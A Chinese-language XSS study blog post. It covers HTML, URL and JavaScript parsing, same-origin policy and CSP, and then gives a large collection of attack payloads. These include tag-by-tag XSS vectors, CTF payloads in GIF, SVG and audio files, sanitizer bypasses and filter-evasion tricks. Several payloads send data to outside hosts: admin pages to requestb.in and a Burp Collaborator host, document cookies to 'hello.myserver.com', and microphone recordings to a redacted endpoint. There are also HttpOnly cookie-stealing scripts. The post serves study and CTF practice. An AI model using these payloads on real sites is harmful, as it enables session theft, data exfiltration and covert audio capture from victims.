---
title: XSS学习
date: 2019-03-20 09:55:20
tags:
- XSS
- CSP
- 同源策略
---
简单的学习并归纳下XSS的学习。涉及到同源策略，跨域，CSP，HTML渲染过程，CSRF和XSS区别，防护以及一些实践的分析。
<!--more-->


# 前置知识

## 深入理解浏览器解析机制和XSS向量编码
转载
文章：
- http://bobao.360.cn/learning/detail/292.html

如下几个代码：
```html
<a href="%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29"></a>
URL 编码 "javascript:alert(1)"
<a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:%61%6c%65%72%74%28%32%29">
HTML字符实体编码 "javascript" 和 URL 编码 "alert(2)"
  <a href="javascript%3aalert(3)"></a>
URL 编码 ":"
  <div>&#60;img src=x onerror=alert(4)&#62;</div>
HTML字符实体编码 < 和 >
  <textarea>&#60;script&#62;alert(5)&#60;/script&#62;</textarea>
HTML字符实体编码 < 和 >
<textarea><script>alert(6)</script></textarea>
  <button onclick="confirm('7&#39;);">Button</button>
HTML字符实体编码 " ' " （单引号）
 <button onclick="confirm('8\u0027);">Button</button>
Unicode编码 " ' " （单引号）
  <script>&#97;&#108;&#101;&#114;&#116&#40;&#57;&#41;&#59</script>
HTML字符实体编码 alert(9);
  <script>\u0061\u006c\u0065\u0072\u0074(10);</script>
Unicode 编码 alert
  <script>\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0031\u0029</script>
Unicode 编码 alert(11)
 <script>\u0061\u006c\u0065\u0072\u0074(\u0031\u0032)</script>
Unicode 编码 alert 和 12
  <script>alert('13\u0027)</script>
Unicode 编码 " ' " （单引号）
  <script>alert('14\u000a')</script>
Unicode 编码换行符（0x0A）
<a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x33;&#x31;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x36;&#x33;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x33;&#x35;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x37;&#x25;&#x33;&#x32;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x37;&#x25;&#x33;&#x34;&#x28;&#x31;&#x35;&#x29;"></a>
<a &#x61; '$#x61;' ='$#x61' ''='&#x61;'>&#x61;</a>
```
观看参考文章之后我做出以下分析。

### 分析
接下来我们可以一个个分析下前面的例子：
1. `<a href="%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29"></a>`
URL资源类型必须是ASCII字母（U+0041-U+005A || U+0061-U+007A），不然就会进入“无类型”状态。例如，你不能对协议类型进行任何的编码操作，不然URL解析器会认为它无类型。这就是为什么问题1中的代码不能被执行。因为URL中被编码的“javascript”没有被解码，因此不会被URL解析器识别。该原则对协议后面的“：”（冒号）同样适用，即
2. `<a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&colon;%61%6c%65%72%74%28%32%29">Click me</a>` 
当浏览器从网络堆栈中获得一段内容后，触发HTML解析器来对这篇文档进行词法解析。在这一步中字符引用被解码。
3. `<a href="javascript%3aalert(3)"></a>`
同第一个
4. `<div>&#60;img src=x onerror=alert(4)&#62;</div>`
解析器解析完“<div>”处于“数据状态”。会对数据状态中的字符引用解析，但是解析器在解析这2个字符引用后不会转换到“标签开始状态”，正因为如此，就不会建立新标签。
5. `<textarea>&#60;script&#62;alert(5)&#60;/script&#62;</textarea>`
浏览器解析RCDATA元素的过程中，解析器会进入“RCDATA状态”。在这个状态中，如果遇到“<”字符，它会转换到“RCDATA小于号状态”，RCDATA元素标签的内容中（例如`<textarea>`或`<title>`的内容中），唯一能够被解析器认做是标签的就是“`</textarea>`”或者“`</title>`。
6. `<button onclick="confirm('7&#39;);">Button</button>`
HTML解析进行词法分析，吧&#39解析为`'`;
7. `<button onclick="confirm('8\u0027);">Button</button>`
Unicode转义序列只有在标识符名称里不被当作字符串，也只有在标识符名称(函数名，属性名)里的编码字符能够被正常的解析
8. `<script>\u0061\u006c\u0065\u0072\u0074(10);</script>`
同上
9. `<script>\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0031\u0029</script>`
同上
10. `<script>\u0061\u006c\u0065\u0072\u0074(\u0031\u0032)</script>`
`\u0031\u0032`被解析为字符串，但是缺少引号。
11. `<script>&#97;&#108;&#101;&#114;&#116&#40;&#57;&#41;&#59</script>`
“script”块有个有趣的属性：在块中的字符引用并不会被解析和解码。如果你去看“脚本数据状态”的状态转换规则，就会发现没有任何规则能转移到字符引用状态。
12. `<a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x33;&#x31;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x36;&#x33;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x33;&#x35;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x37;&#x25;&#x33;&#x32;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x37;&#x25;&#x33;&#x34;&#x28;&#x31;&#x35;&#x29;">asdf</a>`
html此法解析，然后href标签，进行url词法解析，并解码url，发现是javascript协议，进行javascript词法解析。
14. `<a &#x61; '$#x61;' ='$#x61' ''='&#x61;'>&#x61;</a>`
只有数据状态的字符引用和属性名中的字符引用会被html解码

对于以上作者的分析，我觉得在解析流方面有一点偏差（未经考究）。我认为
HTML的解析顺序为：HTML词法分析，JavaScript解析，URL此法解析。在此之后还可能会存在URL或者Javscript解析。如`href="javascript:alert(1)`href经过javascript解析认为是url链接，所以再进行url解析，然后url解码等操作之后，解析协议为javascript协议，然后再调用javascript解析。

### HTML词法分析
对于除了RCDATA元素(`textarea`,`title`)和原始文本元素(`script`,`style`)之外的元素存在常规的字符引用以及常规的解析流程。

**常规的字符引用**：数据状态的字符引用、属性名中的字符引用。在这些状态中HTML字符实体将会从“&#...”形式解码，对应的解码字符会被放入数据缓冲区中。且解析器在数据状态时解析字符引用后不会转换到其他状态。
**常规的解析流程**：遇到`<`符号（每回合没有跟`/`符号）就会进入“标签开始状态”，然后转换到“标签名状态”、“属性名状态”检测到`>`进入数据状态，并释放前标签的token。直到发现一个完整的标签，就会释放出一个token。
**RCDATA和原始文本元素的不同之处**：
1. 在RCDATA元素标签开始到标签结束之间的内容（例如`<textarea>`或`<title>`的内容中），唯一能够被解析器认做是标签的就是“`</textarea>`”或者“`</title>`”。不会创建新元素。
2. 原始文本元素中不允许字符引用

### URL解析
1. URL资源类型必须是ASCII字母，不然就会进入“无类型”状态；
2. URL会解码所有需要URL解析的字符串，如href属性的值
3. 但不能对协议类型进行任何的编码操作，不然URL解析器会认为它无类型,该原则对协议后面的“：”（冒号）同样适用；
4. URL编码过程使用UTF-8编码类型来编码每一个字符。如果你尝试着将URL链接做了其他编码类型的编码，URL解析器就可能不会正确识别；

### JavaScript解析
1. 当Unicode转义序列存在于字符串中时，它只会被解释为正规字符，而不是单引号，双引号或者换行符这些能够打破字符串上下文的字符。因此，Unicode转义序列将永远不会破环字符串上下文，因为它们只能被解释成字符串常量。
2. 当Unicode转义序列出现在标识符名称中时，它会被解码并解释为标识符名称的一部分，例如函数名，属性名等等
Unicode转义序列只有在标识符名称里不被当作字符串，也只有在标识符名称里的编码字符能够被正常的解析。

### 三种类型的解析细则：
HTML：https://html.spec.whatwg.org/multipage/parsing.html#tokenization
URL：https://url.spec.whatwg.org/
JavaScript：https://www.ecma-international.org/publications/standards/Ecma-262.htm

## 同源策略和CORS和CSP
### 同源策略
- https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy
如果两个页面的协议，端口（如果有指定）和主机都相同，则两个页面具有相同的源，如以下例子：
![](/images/19-4-19_XSS学习_同源策略_1.png)

1. 在页面中用 about:blank 或 javascript: URL 执行的脚本会继承打开该 URL 的文档的源，因为这些类型的 URLs 没有明确包含有关原始服务器的信息。
2. 页面可能会因某些限制而改变他的源。脚本可以将 document.domain 的值设置为其当前域或其**当前域**的**父域**。如果将其设置为其当前域的父域，则这个较短的父域将用于后续源检查。
3. file同源策略
- https://developer.mozilla.org/zh-CN/docs/Archive/Misc_top_level/Same-origin_policy_for_file:_URIs

**允许跨域的方法**
1. 标签：
- `<script src="..."></script>` 标签嵌入跨域脚本。语法错误信息只能在同源脚本中捕捉到。
- `<link rel="stylesheet" href="...">` 标签嵌入CSS。由于CSS的松散的语法规则，CSS的跨域需要一个设置正确的Content-Type 消息头。不同浏览器有不同的限制： IE, Firefox, Chrome, Safari (跳至CVE-2010-0051)部分 和 Opera。
- `<img>`嵌入图片。支持的图片格式包括PNG,JPEG,GIF,BMP,SVG,...
- `<video>` 和 `<audio>`嵌入多媒体资源。
- `<object>`, `<embed>` 和 `<applet>` 的插件。
- `@font-face` 引入的字体。一些浏览器允许跨域字体（ cross-origin fonts），一些需要同源字体（same-origin fonts）。
- `<frame>` 和 `<iframe>` 载入的任何资源。站点可以使用X-Frame-Options消息头来阻止这种形式的跨域交互。

2. API
- XMLHttpRequest(CORS)
- window.postMessage() 
通常，对于两个不同页面的脚本，只有当执行它们的页面位于具有相同的协议（通常为https），端口号（443为https的默认值），以及主机  (两个页面的模数 Document.domain设置为相同的值) 时，这两个脚本才能相互通信

### CSP
参考：https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP
- 内容安全策略(CSP) 是一个额外的安全层，通过设置HTTP头的方式来告诉浏览器对脚本的限制。
- 为使CSP可用, 你需要配置你的网络服务器返回  Content-Security-Policy  HTTP头部 ( 有时你会看到一些关于X-Content-Security-Policy头部的提法, 那是旧版本，你无须再如此指定它)。
- `<meta>`元素也可以被用来配置该策略。

### CORS
CORS参考之前的文章：CORS学习

# 攻击手段
1. **可能存在XSS攻击的标签**
```html
a
	<a href="javascript:alert(/test/)" onclick=alert(1)>xss</a>
audio
	<audio src=x onerror=alert(47)>
button
	<button/onclick=alert(1) >M</button>
	<form><button formaction=javascript&colon;alert(1)>M
	<button onfocus=alert(1) autofocus>
div
	<div/onmouseover='alert(1)'>X
	<div style="position:absolute;top:0;left:0;width:100%;height:100%" onclick="alert(52)">
embed
	https://github.com/evilcos/xss.swf/blob/master/xss_source.txt
	<EMBED SRC="xss.swf" ></EMBED>
form
	<form action=javascript:alert('xss') method="get" >
	<form method=post action=aa.asp? onmouseover=alert('xss')>
	<form method=post action="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4="> //chrome受限
iframe
	<iframe/onload=alert(1)></iframe>
	<iframe src=javascript:alert('xss');height=0 width=0 /><iframe>
	<iframe src="data:text/html,&lt;script&gt;alert('xss')&lt;/script&gt;"></iframe>
	<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
	<iframe src="aaa" onmouseover=alert('xss') /><iframe>
	<iframe src="javascript&colon;prompt&lpar;`xss`&rpar;"></iframe>
img
	<img src="1" onerror=eval("alert('xss')")>
	<img src="x" onerror=alert(1)>
	<img src=1 onmouseover=alert('xss')>
	<img/src/onerror=alert(1)>
	<img src ?itworksonchrome?\/onerror = alert(1)>
	<img src onerror = alert(1)>
input
	<input value="" onclick=alert('xss') type="text">
isindex
	<isindex type=image src=1 onerror=alert(1)> 
keygen
	<keygen onfocus=javascript:alert(1) autofocus>
marquee
	<marquee onstart="alert('1')"></marquee>
object
	<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>//<script>alert(1)</script>
script标签：
	<script>alert('xss')</script>
	<script>alert("xss")</script>
	<script>alert(/xss/)</script> //双引号换成斜杠
	<script>alert("xss");</script> //用分号
	<script>alert('xss');</script>
	<script>alert(/xss/);</script>
	<script>alert("xss");;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</script> //用分号
	<script>alert("xss");;;;;;;;;;;;;;;;; ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</script> //空格+分号
	<script>alert('aaaaaa');;;;\n;;;;</script>//换行符
	<script>alert('aaaaaa');;;;\r;;;;</script>//回车
select
	<select onfocus=javascript:alert(1) autofocus>
svg
	<svg onload=alert(1)>
textarea
	<textarea onfocus=javascript:alert(1) autofocus>
var
	<var onmouseover="prompt(1)">M</var>
video
	<video><source onerror="alert(1)"> 
	<video src=x onerror=alert(48)>
```
以上只列取了部分标签。总的来说对于xss出现的地方有几点：
1. 单个属性值或多个属性值组合(isindex)，如href、src、action
2. 事件属性：Window 事件属性、Form 事件、Keyboard 事件、Mouse 事件、Media 事件

基本为以上两点

## 关于图片等媒体流方面的XSS
有img、gif、svg以及jpg。

### img、gif
用脚本生成img、gif的文件，如果是直接127.0.0.1进行访问，则如果图片文件结尾是gif或者img结尾那么就会收到
![](/images/19-4-19_XSS学习_攻击手段_图片_1.png)这样的警告。如果改成gf则可以成功`alert(1)`。

**CTF**
[DEFCAMP CTF Quals 2017](https://steemit.com/ctf/@maniffin/defcamp-ctf-quals-2017-llc-webchall-writeup) WebChall
payload:
```javascript
GIF89a= 'MUMBOJUMBOBOGUSBACON';var xh = new XMLHttpRequest();xh.open("GET", "admin.php", false);xh.send();document.location="https://requestb.in/um61ebum?foo="+btoa(xh.responseText);
```

### jpg
https://portswigger.net/blog/bypassing-csp-using-polyglot-jpegs
https://www.aperikube.fr/docs/tjctf_2018/stupid_blog/#tl-dr

### SVG
**CTF**
[CONFidence CTF 2019](http://yulige.top/?p=665)
payload
```javascript
<?xml version="1.0" encoding="UTF-8"?> 
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="Layer_1" x="0px" y="0px" width="100px" height="100px" viewBox="-12.5 -12.5 100 100" xml:space="preserve"> 
  <g>
    <polygon fill="#00B0D9" points="41.5,40 38.7,39.2 38.7,47.1 41.5,47.1 ">
    </polygon>
    <script>
      var xhr = new XMLHttpRequest();
      xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
          var xhr2 = new XMLHttpRequest();
          xhr2.open("POST", "http://XXXX.burpcollaborator.net/");
          xhr2.send(xhr.responseText);
        }
      }   
      xhr.open("GET", "http://web50.zajebistyc.tf/profile/admin");
      xhr.withCredentials = true;
      xhr.send();
      alert(1);
    </script>
  </g>
</svg>
```
[0CTF 2017 Quals](https://ctftime.org/writeup/5956) [simplexss](https://www.40huo.cn/blog/0ctf-2017-writeup.html)
题目利用svg或者link标签引用加载外部url的方式执行js代码，利用XMLHttpRequest发送请求，要考虑CORS方面的问题，设置头，以及协议是否相同。
```javscript
简化后
<svg onload=location=name>"
<script>
window.name = "javascript:%76%61%72%20%78%68%72%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%0a%78%68%72%2e%6f%70%65%6e%28%27%47%45%54%27%2c%20%27%68%74%74%70%3a%2f%2f%31%32%30%2e%37%37%2e%32%31%39%2e%32%31%3a%38%30%27%2c%20%66%61%6c%73%65%29%3b%0a%78%68%72%2e%73%65%6e%64%28%29%3b%0a%69%66%20%28%78%68%72%2e%73%74%61%74%75%73%20%3d%3d%20%32%30%30%29%20%7b%0a%20%20%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%3a%2f%2f%31%32%30%2e%37%37%2e%32%31%39%2e%32%31%3a%38%31%3f%72%65%73%75%6c%74%3d%27%2b%78%68%72%2e%72%65%73%70%6f%6e%73%65%54%65%78%74%3b%0a%7d";
</script>
```
这里值得学习的就是利用了 `onload=locationn=name`

### SWF
参考：https://medium.com/@friendly_/xss-through-swf-file-4f04af7b0f59

### audio
**CTF**
[PlaindCTF 2018](https://github.com/neptunia/plaidctf-writeups-2018/blob/master/idiot_action.md)
观看Writeup之后可以知道，作者借鉴了image进行xss攻击的手法。构造文件头然后后续插入恶意代码进行攻击。攻击payload：
```javascript
	// appends an audio element to playback and download recording
	function createAudioElement(blobUrl) {
		var oReq = new XMLHttpRequest();
		oReq.open("GET", blobUrl, true);
		oReq.responseType = "arraybuffer";

		oReq.onload = function (oEvent) {
			var arrayBuffer = oReq.response; // Note: not oReq.responseText
			if (arrayBuffer) {
				var sicedeets = Array.prototype.map.call(new Uint8Array(arrayBuffer), x => ('00' + x.toString(16)).slice(-2)).join('');
				var oreq2 = new XMLHttpRequest();
				oreq2.open("POST", "<redacted>", true);
				oreq2.send(sicedeets);
			}
		};
		oReq.send(null);
	}

	// request permission to access audio stream
	navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
		// store streaming data chunks in array
		const chunks = [];
		// create media recorder instance to initialize recording
		const recorder = new MediaRecorder(stream);
		// function to be called when data is received
		recorder.ondataavailable = e => {
			// add stream data to chunks
			chunks.push(e.data);
			// if recorder is 'inactive' then recording has finished
			if (recorder.state == 'inactive') {
				// convert stream data chunks to a 'webm' audio format as a blob
				const blob = new Blob(chunks, {type: 'audio/webm'});
			// convert blob to URL so it can be assigned to a audio src attribute
			createAudioElement(URL.createObjectURL(blob));
			}
		};
		// start recording with 1 second time between receiving 'ondataavailable' events
		recorder.start(1000);
		// setTimeout to stop recording after 4 seconds
		setTimeout(() => {
			// this will trigger one final 'ondataavailable' event and set recorder state to 'inactive'
			recorder.stop();
		}, 20000);
	}).catch(console.error);
```

## 相关库漏洞
### mistune
**版本**：<=8.0
**验证**：
```python
import mistune
renderer = mistune.Renderer(escape=True, hard_wrap=True)
markdown = mistune.Markdown(renderer=renderer)
markdown("<javascript:document.location='hello.myserver.com/?cookie='+document.cookies>");
``` 

### mermaid
**版本**：？？？
**验证**：
```javascript
//搜索`mermaid insert tag`
graph LR
id1("<img src='' onerror='alert(1)'></img>")

graph LR; D-->X((<img src='/address/to/image.png' width=5 onerror='javascript:alert`1`' >))
```

### DomPurify
**版本**：？？？
**验证**：
官方介绍有：
**The resulting HTML can be written into a DOM element using innerHTML or the DOM using document.write(). That is fully up to you. But keep in mind, if you use the sanitized HTML with jQuery's very insecure elm.html() method, then the SAFE_FOR_JQUERY flag has to be set to make sure it's safe! Other than that, all is fine.**
以及官方的测试如下：
![](/images/19-4-7_midnighctf-2019_Marcoolio_1.png)
```javascript
<option><style></option></select><b><img src=xx: onerror=alert(1)></style></option>
```

### Angular
Angular是一个比较流行的前端框架

## 事件型漏洞
现实生活中的实际例子和CTF比赛中特地构造的漏洞环境。
**CTF比赛中总结就是：**
- 管理员(终端)会打开一个存在XSS的页面，这个页面对于你来说有可控点。
- 管理员(终端)会回显你构造的字符串。
- 等一些其他例子。

**实际例子**
后续添加

## bypass httponly

1. 利用调试信息，如：PHP 的 phpinfo() 和Django 的调试信息，里边都记录了 Cookie 的值，且标志了HttpOnly 的 Cookie 也同样可以获取到。
```
<?php
header("Set-Cookie: SESSIONID=ImAhttpOnlyCookie; path=/; httponly");
?>
<a href='phpinfo.php'>aa</a>
```

2. apache 400(Apache 2.2.0 – 2.2.21)
```
<?php
header("Set-Cookie: SESSIONID=ImAhttpOnlyCookie; path=/; httponly");
?>
<script type="text/javascript">
var today = new Date();
var expire = new Date();
expire.setTime(today.getTime() + 2000);
gotCookie=false;
padding="";
for (j=0;j<=1000;++j) {
    padding+="A";
}
for (i=0;i < 10; ++i) {
    document.cookie="z"+i+"="+padding+"; expires="+expire.toGMTString()+"; path=/;"
}

function handler() {
    if (!gotCookie && this.responseText.length > 1) {
    text = /(SESSIONID=[^;]*)/i.exec(this.responseText);
    alert(text[1]);
    gotCookie=true;
    }
}var xhr = new XMLHttpRequest();
xhr.onreadystatechange = handler;
xhr.open("GET", "/httponly.php");
xhr.send();
</script>
```

## Tricks
### 绕过方面
1. 正则匹配问题：
- 只匹配前半部分
- 只匹配后半部分

2. 几种编码：
- js编码
- html实体编码
- url编码
- String.fromCharCode编码
- js是大小写敏感的  但是html是大小写不敏感的
- ECMAscript规范，那么你应该会发现除了0x0A/0x0D以外U+2028/2029也可以作为换行符来使用。
参考：https://mathiasbynens.be/notes/javascript-escapes#hexadecimal

3. 利用location绕过关键字检测
![](location3.png)
- hash方法
```javascript
url中：`http://xxx.xxx.xxx/#alert(1)`
<body/onload=eval(location.hash.slice(1))>
Set.constructor(location.hash.substr(1))()
```
- 字符拼接
```javascript
<img src="1" onerror=location="javascr"+"ipt:al"+"ert%28docu"+"ment.co"+"okie%29">
<img src="1" onerror="a=&quot;%2&quot;,location=&quot;javascript:aler&quot;+&quot;t&quot;+a+&quot;81&quot;+a+&quot;9&quot;" ""=""> //拼接url编码的%28 %29。
```

4. eval函数的替代
- 匿名函数
```javascript
<img src="1" onerror=Function(alert(1))()>
```
- 时钟函数
```javascript
<img src=# onerror=setTimeout(alert(1),1000)>
<img src=# onerror=setInterval(alert(1),1000)>
```
- IE特有的execScript
```javascript
execScript(location.hash.substr(1)) 
```

6. 过滤了.
- 使用with
```javascript
with(location)with(hash)eval(alert(1))
```

7. HTTP
- 防止 CRLF 注入/HTTP 响应拆分
- 禁止 TRACE 和其他非必要方法

8. alert的替代
- throw接受异常，[文章](https://xz.aliyun.com/t/4936)
```javascript
<a onmouseover="javascript:top.onerror=alert;throw 1">aa</a>
```

9. IE8/IE9 %00绕过
```javascript
<img src="" onerror=javascript:top.onerror=al%00ert;throw 1>
```

10. 一些地方被编码无法执行，我们可以通过其他地方调用这段代码来执行。

11. [无字母xss](https://xz.aliyun.com/t/1267)
- 利用对象可以写成中括号形式并编码对象
```javascript
//"...".constructor.constructor("alert(1)")()
	"..."["\163\165\142\163\164\162"]["\143\157\156\163\164\162\165\143\164\157\162"]("\141\154\145\162\164\50\61\51")()
```
- jsfuck

### 一些知识点
1. Do DOM tree elements with ids become global variables?
	https://stackoverflow.com/questions/3434278/do-dom-tree-elements-with-ids-become-global-variables
2. InnerHTML、以及其和InnerTEXT的区别
	https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML
	https://stackoverflow.com/questions/19030742/difference-between-innertext-and-innerhtml
```javascript
<div id="example">some text</div>
<script>
	if(example){
		alert(example);
	}
</script>
```


## 脚本编写指南
对于基础的语法和函数要足够的熟悉。以及以下几个等API的参数特性，接口等要熟悉。

window.addEventListener和postMessage
fetch
new Image().src
XMLHttpRequest
JSONP

Navigator、document对象
事件触发. onload等

data、JavaScript等协议
\`\` '' ""中间的都算是字符串。

try catch

# XSS小游戏
Foogle: http://www.xssgame.com